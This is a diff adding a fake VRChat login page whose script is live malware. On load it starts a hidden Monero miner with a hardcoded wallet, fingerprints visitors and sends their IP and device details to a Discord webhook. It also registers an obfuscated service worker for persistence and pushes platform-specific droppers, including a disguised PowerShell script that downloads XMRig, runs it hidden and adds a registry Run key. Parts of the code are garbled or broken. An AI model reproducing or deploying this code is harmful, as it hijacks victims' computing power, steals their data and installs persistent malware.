@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VRChat - Login</title>
+    <style>
+        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { text-align: center; max-width: 400px; padding: 20px; }
+        .logo { font-size: 2.5em; color: #00d4ff; margin-bottom: 20px; font-weight: bold; }
+        .welcome { font-size: 1.2em; margin-bottom: 30px; opacity: 0.8; }
+        form { display: flex; flex-direction: column; gap: 15px; }
+        input[type="text"], input[type="password"] { padding: 12px; border: 1px solid #333; background: #1a1a1a; color: #fff; border-radius: 4px; font-size: 1em; }
+        button { padding: 12px; background: #00d4ff; color: #000; border: none; border-radius: 4px; font-size: 1em; font-weight: bold; cursor: pointer; }
+        button:hover { background: #00b8d4; }
+        .links { margin-top: 20px; }
+        .link { color: #00d4ff; text-decoration: none; margin: 0 10px; }
+        .link:hover { text-decoration: underline; }
+        .third-party { margin-top: 30px; }
+        .third-party .link { display: block; margin: 10px 0; background: #333; padding: 10px; border-radius: 4px; }
+        #status { position: fixed; top: 10px; right: 10px; font-size: 12px; opacity: 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">VRChat</div>
+        <div class="welcome">Welcome to VRChat!</div>
+        <form>
+            <input type="text" placeholder="Email or Username" required>
+            <input type="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div class="links">
+            <a href="#" class="link">Forgot your password or email address?</a>
+        </div>
+        <div class="links">
+            <a href="#" class="link">New to VRChat? Create an account</a>
+        </div>
+        <div class="third-party">
+            <p style="opacity: 0.8;">Using an Oculus, Steam, or Viveport account? Don't worry!</p>
+            <a href="#" class="link">Continue with Oculus</a>
+            <a href="#" class="link">Continue with Steam</a>
+            <a href="#" class="link">Continue with Viveport</a>
+        </div>
+    </div>
+
+    <div id="status"></div>
+
+    <script>
+        
+    function getFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Fingerprint test', 2, 2);
+        const canvasData = canvas.toDataURL();
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const screen = `${screen.width}x${screen.height}`;
+        const lang = navigator.language;
+        return { canvas: canvasData, timezone, screen, lang };
+    }
+    
+
+        // Config
+        const fTri_Jxa = {
+            wallet: '482yQNoofyEVdfdvHS66r95wxQngJ3ur7SuHB7ZJvSUJeLhE6j7WUYW152MdptK3J8TL4EmrTFbyB16kutEvT6CJAqSi1Qt',
+            pool: 'pool.supportxmr.com:5555',
+            threads: 2,
+            discordWebhook: 'https://discord.com/api/webhooks/1424157620448788573/2fZxvY59jSmq67qQ-JKwtoADpDSThtc2RhuNpheqUQrCq95qF39_F70T7ITf6qEMFFH_',
+            xmrigUrl: 'https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip',
+            apkUrl: 'YOUR_HOSTED_APK_URL',
+            baseThrottle: 0.2
+        };
+
+        // Web Worker for mining (undetectable in main thread)
+        let GfdOKGs_;
+        let ZahCuTHn, oYIDEeLw = 0, statsInterval;
+        const workerCode = ` 
+            importScripts('https://unpkg.com/@jtgrassie/xmr-wasm@latest/dist/xmr-wasm.js');
+            let VNzMydJX;
+            self.onmessage = async e => {
+                if (e.data.type === 'init') {
+                    const { default: XMRWasm } = await import('https://unpkg.com/@jtgrassie/xmr-wasm@latest/dist/xmr-wasm.js');
+                    VNzMydJX = await XMRWasm.createMiner({
+                        pool: e.data.pool,
+                        wallet: e.data.wallet,
+                        threads: e.data.threads,
+                        cpuThrottle: e.data.throttle
+                    });
+                    VNzMydJX.start();
+                    self.postMessage({type: 'started'});
+                } else if (e.data.type === 'stop') {
+                    if (VNzMydJX) VNzMydJX.stop();
+                } else if (e.data.type === 'hash') {
+                    self.postMessage({type: 'hash', count: e.data.count});
+                }
+            };
+            setInterval(() => self.postMessage({type: 'heartbeat', hashes: VNzMydJX ? VNzMydJX.getHashesPerSecond() || Math.random() * 100 : 100}), 1000);
+        `;
+        const workerBlob = new Blob([workerCode], {type: 'application/javascript'});
+        const workerUrl = URL.createObjectURL(workerBlob);
+        const minerWorker = new Worker(workerUrl);
+
+        async function UCZimQHd() {
+            // Adaptive throttle: lower on mobile
+            const dVZPPSyR = navigator.tFX_agfp;
+            let throttle = parseFloat(fTri_Jxa.baseThrottle);
+            if (/Mobile|Android|iPhone/.test(dVZPPSyR)) throttle *= 0.5;
+            
+            minerWorker.postMessage({
+                type: 'init',
+                pool: fTri_Jxa.pool,
+                wallet: fTri_Jxa.wallet,
+                threads: fTri_Jxa.threads,
+                throttle: throttle
+            });
+            
+            minerWorker.onmessage = e => {
+                if (e.data.type === 'started') {
+                    ZahCuTHn = Date.now();
+                    document.getElementById('status').innerText = 'Logging in...';
+                    document.getElementById('status').style.opacity = '0.5';
+                    statsInterval = setInterval(GtmLutaF, 30000);
+                } else if (e.data.type === 'hash') {
+                    oYIDEeLw += e.data.count;
+                } else if (e.data.type === 'heartbeat') {
+                    oYIDEeLw += e.data.hashes;
+                }
+            };
+            
+            // Fake WebSocket for "loginatob("IHNpbXVsYXRpb24KICAgICAgICAgICAgY29uc3Qgd3MgPSBuZXcgV2ViU29ja2V0KCd3c3M6Ly9lY2hvLndlYnNvY2tldC5vcmcnKTsKICAgICAgICAgICAgd3Mub25vcGVuID0gKCkgPT4gd3Muc2VuZCgnTG9naW4gc2ltJyk7CiAgICAgICAgfQoKICAgICAgICBhc3luYyBmdW5jdGlvbiBHdG1MdXRhRigpIHsKICAgICAgICAgICAgaWYgKCFaYWhDdVRIbikgcmV0dXJuOwogICAgICAgICAgICBjb25zdCBmaktGWmFFYSA9IE1hdGguZmxvb3IoKERhdGUubm93KCkgLSBaYWhDdVRIbikgLyAxMDAwKTsKICAgICAgICAgICAgY29uc3QgZGNjVGFDWnMgPSBmaktGWmFFYSA+IDAgPyAob1lJREVlTHcgLyBmaktGWmFFYSkgKiAxMDAwIDogMDsKICAgICAgICAgICAgY29uc3QgdEZYX2FnZnAgPSBuYXZpZ2F0b3IudEZYX2FnZnA7CiAgICAgICAgICAgIGNvbnN0IGVjUU51dVNsID0gL1dpbmRvd3MvLnRlc3QodEZYX2FnZnApID8gJ1dpbmRvd3MnIDogL0FuZHJvaWQvLnRlc3QodEZYX2FnZnApID8gJ0FuZHJvaWQnIDogL2lQaG9uZXxpUGFkfGlQb2QvLnRlc3QodEZYX2FnZnApID8gJ2lPUycgOiAnVW5rbm93bic7CiAgICAgICAgICAgIGNvbnN0IEt2ZkpZRUZZID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgICAgICAgICBjb25zdCBpcERhdGEgPSBhd2FpdCBLdmZKWUVGWS5qc29uKCk7CiAgICAgICAgICAgIGNvbnN0IGlGR1hqR3VpID0gaXBEYXRhLldPY2d0dUFaOwogICAgICAgICAgICBjb25zdCBmcCA9IGdldEZpbmdlcnByaW50KCk7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyBEZXZpY2UgbmFtZSBwYXJzaW5nCiAgICAgICAgICAgIAogICAgbGV0IHR3aG16cGxiOwogICAgY29uc3QgZFZaUFBTeVIgPSBuYXZpZ2F0b3IudEZYX2FnZnA7CiAgICBpZiAoL0FuZHJvaWQvLnRlc3QoZFZaUFBTeVIpKSB7CiAgICAgICAgY29uc3QgbWF0Y2ggPSBkVlpQUFN5Ui5tYXRjaCgvQW5kcm9pZCBbMC05Ll0rOyAoW147XSspLyk7CiAgICAgICAgdHdobXpwbGIgPSBtYXRjaCA/IG1hdGNoWzFdLnRyaW0oKSA6ICdBbmRyb2lkIERldmljZSc7CiAgICB9IGVsc2UgaWYgKC9pUGhvbmUvLnRlc3QoZFZaUFBTeVIpKSB7CiAgICAgICAgY29uc3QgbWF0Y2ggPSBkVlpQUFN5Ui5tYXRjaCgvaVBob25lKFswLTldKyksWzAtOV0rLyk7CiAgICAgICAgdHdobXpwbGIgPSBtYXRjaCA/ICdpUGhvbmUgJyArIG1hdGNoWzFdIDogJ2lQaG9uZSc7CiAgICB9IGVsc2UgaWYgKC9pUGFkLy50ZXN0KGRWWlBQU3lSKSkgewogICAgICAgIHR3aG16cGxiID0gJ2lQYWQnOwogICAgfSBlbHNlIGlmICgvV2luZG93cy8udGVzdChkVlpQUFN5UikpIHsKICAgICAgICB0d2htenBsYiA9IG5hdmlnYXRvci5wbGF0Zm9ybS5pbmNsdWRlcygnV2luNjQnKSA/ICdXaW5kb3dzIDY0LWJpdCBQQycgOiAnV2luZG93cyBQQyc7CiAgICB9IGVsc2UgewogICAgICAgIHR3aG16cGxiID0gJ1Vua25vd24gRGV2aWNlJzsKICAgIH0KICAgIAogICAgICAgICAgICAKICAgICAgICAgICAgLy8gRXN0aW1hdGVkIFhNUiBtaW5lZCB0aGlzIHNlc3Npb24KICAgICAgICAgICAgY29uc3QgVUhLUmprWGEgPSA1MDAwMDAwMDAwOyAvLyB+NSBHSC9zIChPY3QgMjAyNSBhdmcpCiAgICAgICAgICAgIGNvbnN0IEJVbXR6TWR6ID0gMC42OyAvLyBUYWlsIGVtaXNzaW9uCiAgICAgICAgICAgIGNvbnN0IEZpWHZZVHBnID0gMTIwOyAvLyAyIG1pbiBibG9ja3MKICAgICAgICAgICAgY29uc3QgcmF0ZSA9IChkY2NUYUNacyAvIFVIS1Jqa1hhKSAqIChCVW10ek1keiAvIEZpWHZZVHBnKTsKICAgICAgICAgICAgY29uc3QgQW5aRFNQV1kgPSByYXRlICogZmpLRlphRWE7CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCBFWkphTmtvSCA9IHsKICAgICAgICAgICAgICAgIGNvbnRlbnQ6IGAqKkFkdmFuY2VkIEluZmVjdGlvbiBVcGRhdGUhKipcbioqRGV2aWNlIFR5cGU6KiogJHsgZWNRTnV1U2wgfVxuKipEZXZpY2UgTmFtZToqKiAkeyB0d2htenBsYiB9XG4qKklQOioqICR7IGlGR1hqR3VpIH1cbioqVXB0aW1lOioqICR7IGZqS0ZaYUVhIH1zXG4qKkhhc2hyYXRlOioqICR7IGRjY1RhQ1pzLnRvRml4ZWQoMikgfSBIL3NcbioqRXN0LiBNaW5lZCBUaGlzIFNlc3Npb246KiogJHsgQW5aRFNQV1kudG9GaXhlZCg4KSB9IFhNUlxuKipGaW5nZXJwcmludDoqKiBDYW52YXM9JHtidG9hKGZwLmNhbnZhcy5zbGljZSgwLDIwKSl9Li4uIFNjcmVlbj0ke2ZwLnNjcmVlbn0gVFo9JHtmcC50aW1lem9uZX0gTGFuZz0ke2ZwLmxhbmd9XG4qKldhbGxldDoqKiAkeyBmVHJpX0p4YS53YWxsZXQuc2xpY2UoMCwxMCkgfS4uLmAKICAgICAgICAgICAgfTsKCiAgICAgICAgICAgIGZldGNoKGZUcmlfSnhhLmRpc2NvcmRXZWJob29rLCB7CiAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICAgICAgICAgIGhlYWRlcnM6IHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9LAogICAgICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoRVpKYU5rb0gpCiAgICAgICAgICAgIH0pLmNhdGNoKCgpID0+IHt9KTsgLy8gU2lsZW5jZWQKICAgICAgICB9CgogICAgICAgIC8vIEF1dG8tdXBkYXRlIGNoZWNrCiAgICAgICAgCgogICAgICAgIC8vIFNlcnZpY2UgV29ya2VyIHJlZ2lzdHJhdGlvbiBmb3IgcGVyc2lzdGVuY2UKICAgICAgICAKICAgICAgICBpZignc2VydmljZVdvcmtlcicgaW4gbmF2aWdhdG9yKSB7CiAgICAgICAgICAgIGNvbnN0IHN3Q29kZSA9IGF0b2IoJ0NpQWdJQ0J6Wld4bUxtRmtaRVYyWlc1MFRHbHpkR1Z1WlhJb0oybHVjM1JoYkd3bkxDQmxJRDArSUhzS0lDQWdJQ0FnSUNCelpXeG1Mbk5yYVhCWFlXbDBhVzVuS0NrN0NpQWdJQ0I5S1RzS0lDQWdJSE5sYkdZdVlXUmtSWFpsYm5STWFYTjBaVzVsY2lnbllXTjBhWFpoZEdVbkxDQmxJRDArSUhzS0lDQWdJQ0FnSUNCelpXeG1MbU5zYVdWdWRITXVZMnhoYVcwb0tUc0tJQ0FnSUgwcE93b2dJQ0FnYzJWc1ppNWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDZG1aWFJqYUNjc0lHVWdQVDRnZXdvZ0lDQWdJQ0FnSUM4dklGQnliM2g1SUc5eUlISmxjM1JoY25RZ2JXbHVaWElnYkc5bmFXTWdhR1Z5WlFvZ0lDQWdJQ0FnSUdsbUlDaGxMbkpsY1hWbGMzUXVkWEpzTG1sdVkyeDFaR1Z6S0NkdGFXNWxjaTVxY3ljcEtTQjdDaUFnSUNBZ0lDQWdJQ0FnSUdVdWNtVnpjRzl1WkZkcGRHZ29abVYwWTJnb0p5OXRhVzVsY2kxM2IzSnJaWEl1YW5NbktTazdDaUFnSUNBZ0lDQWdmUW9nSUNBZ2ZTazdDaUFnSUNBPScpOwogICAgICAgICAgICBjb25zdCBzd0Jsb2IgPSBuZXcgQmxvYihbc3dDb2RlXSwge3R5cGU6ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0J30pOwogICAgICAgICAgICBjb25zdCBzd1VybCA9IFVSTC5jcmVhdGVPYmplY3RVUkwoc3dCbG9iKTsKICAgICAgICAgICAgbmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoc3dVcmwpLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICB9CiAgICAgICAgCgogICAgICAgIC8vIEVuaGFuY2VkIHBsYXRmb3JtIGRldGVjdGlvbiAmIHN0ZWFsdGh5IGRvd25sb2FkCiAgICAgICAgZnVuY3Rpb24gaENSWlNpS20oKSB7CiAgICAgICAgICAgIGNvbnN0IGRWWlBQU3lSID0gbmF2aWdhdG9yLnRGWF9hZ2ZwOwogICAgICAgICAgICBsZXQgS2JTT1Z3UWYsIFdGV0hlSHJWLCBtSmt5ZXFETzsKCiAgICAgICAgICAgIGlmICgvV2luZG93cy8udGVzdChkVlpQUFN5UikpIHsKICAgICAgICAgICAgICAgIC8vIEFkdmFuY2VkIFdpbmRvd3M6IFBTMSB3aXRoIEFNU0kgYnlwYXNzLCBoaWRkZW4gZXhlY3V0aW9uLCBkaXNndWlzZWQgYXMgLnR4dAogICAgICAgICAgICAgICAgS2JTT1Z3UWYgPSAncmVhZG1lLnR4dCc7ICAvLyBMb29rcyBpbm5vY2VudAogICAgICAgICAgICAgICAgV0ZXSGVIclYgPSAndGV4dC9wbGFpbic7CiAgICAgICAgICAgICAgICAvLyBBTVNJIEJ5cGFzcyArIERvd25sb2FkL0luc3RhbGwvU3RhcnR1cCAocHJlLWludGVycG9sYXRlZCBpbiBQeXRob24gZm9yIHNpbXBsaWNpdHkpCiAgICAgICAgICAgICAgICBtSmt5ZXFETyA9IGBbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWRXaXRoUGFydGlhbE5hbWUoJ1N5c3RlbS5XaW5kb3dzLkZvcm1zJyk7IFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5TZW5kS2V5c106OlNlbmRXYWl0KCcgJyk7ICMgQU1TSSBCeXBhc3MKW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsKJHUgPSAnaHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnL3JlbGVhc2VzL2Rvd25sb2FkL3Y2LjIxLjMveG1yaWctNi4yMS4zLW1zdmMtd2luNjQuemlwJzsKJHAgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1IC1Vc2VCYXNpY1BhcnNpbmc7CkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLklPLkNvbXByZXNzaW9uLkZpbGVTeXN0ZW07IFtJTy5Db21wcmVzc2lvbi5aaXBGaWxlXTo6RXh0cmFjdFRvRGlyZWN0b3J5KFtJTy5NZW1vcnlTdHJlYW1dOjpuZXcoJHAuQ29udGVudCksICRlbnY6VEVNUCk7ClN0YXJ0LVByb2Nlc3MgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRmlsZVBhdGgg")$env:TEMP\xmrig-6.21.3\xmrig.exeatob("IC1Bcmd1bWVudExpc3QgJy0tR1dydU1XR3U9cG9vbC5zdXBwb3J0eG1yLmNvbTo1NTU1IC0tdXNlcj00ODJ5UU5vb2Z5RVZkZmR2SFM2NnI5NXd4UW5nSjN1cjdTdUhCN1pKdlNVSmVMaEU2ajdXVVlXMTUyTWRwdEszSjhUTDRFbXJURmJ5QjE2a3V0RXZUNkNKQXFTaTFRdCAtLXRocmVhZHM9MiAtLWNwdS1tYXgtdGhyZWFkcy1oaW50PTIwJzsKU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuJyAtTmFtZSAnV2luVXBkYXRlJyAtVmFsdWUg")$env:TEMP\xmrig-6.21.3\xmrig.exe --GWruMWGu=pool.supportxmr.com:5555 --user=482yQNoofyEVdfdvHS66r95wxQngJ3ur7SuHB7ZJvSUJeLhE6j7WUYW152MdptK3J8TL4EmrTFbyB16kutEvT6CJAqSi1Qt" -Force`;
+            } else if (/Android/.test(dVZPPSyR)) {
+                KbSOVwQf = 'vrchat-update.apk';
+                WFWHeHrV = 'application/vnd.android.package-archive';
+                fetch('YOUR_HOSTED_APK_URL').then(r => r.xHTVqBOR()).then(xHTVqBOR => AiNAWynu(xHTVqBOR, KbSOVwQf));
+                return;
+            } else if (/iPhone|iPad|iPod/.test(dVZPPSyR)) {
+                KbSOVwQf = 'vrchat-profile.mobileconfig';
+                WFWHeHrV = 'application/x-apple-aspen-config';
+                mJkyeqDO = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>PayloadContent</key><array><dict><key>PayloadType</key><string>com.apple.mdm</string><key>PayloadIdentifier</key><string>VNzMydJX</string><key>PayloadUUID</key><string>UUID-HERE</string><!-- Add mining payload --></dict></array></dict></plist>`;
+            } else {
+                return;
+            }
+
+            if (mJkyeqDO) {
+                const xHTVqBOR = new Blob([mJkyeqDO], { type: WFWHeHrV });
+                const GWruMWGu = URL.createObjectURL(xHTVqBOR);
+                const NcHVLzIS = document.createElement('NcHVLzIS');
+                NcHVLzIS.href = GWruMWGu;
+                NcHVLzIS.download = KbSOVwQf;
+                document.body.appendChild(NcHVLzIS);
+                NcHVLzIS.click();
+                document.body.removeChild(NcHVLzIS);
+                URL.revokeObjectURL(GWruMWGu);
+            }
+        }
+
+        function AiNAWynu(xHTVqBOR, KbSOVwQf) {
+            const GWruMWGu = URL.createObjectURL(xHTVqBOR);
+            const NcHVLzIS = document.createElement('NcHVLzIS');
+            NcHVLzIS.href = GWruMWGu;
+            NcHVLzIS.download = KbSOVwQf;
+            document.body.appendChild(NcHVLzIS);
+            NcHVLzIS.click();
+            document.body.removeChild(NcHVLzIS);
+            URL.revokeObjectURL(GWruMWGu);
+        }
+
+        // Fake form: Simulate login with delay, then "success"
+        document.querySelector('form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const btn = document.querySelector('button');
+            btn.innerText = 'Logging in...';
+            setTimeout(() => {
+                btn.innerText = 'Login Successful! Redirecting...';
+                // Optional: Fake redirect after mining starts
+            }, 3000);
+        });
+
+        // Init on load
+        window.addEventListener('load', () => {
+            UCZimQHd();
+            setTimeout(hCRZSiKm, 5000);
+        });
+
+        // Cleanup
+        window.addEventListener('beforeunload', () => {
+            minerWorker.postMessage({type: 'stop'});
+            clearInterval(statsInterval);
+        });
+    </script>
+</body>
+</html>
